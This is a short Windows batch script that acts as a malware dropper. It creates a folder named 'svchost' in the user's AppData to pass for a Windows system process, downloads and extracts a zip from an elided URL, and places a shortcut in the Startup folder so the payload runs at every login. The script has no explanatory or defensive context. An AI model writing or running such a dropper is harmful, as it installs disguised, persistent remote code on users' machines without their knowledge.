@echo off

del C:/del_later

cd %USERPROFILE%/Appdata/Local/Microsoft/

mkdir svchost

cd svchost

curl -OL https:// ...

tar -xf setup.zip

set path_to_lnk=%cd%/svchost.lnk

cd %USERPROFILE%/Appdata/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/

copy %path_to_lnk% .lnk
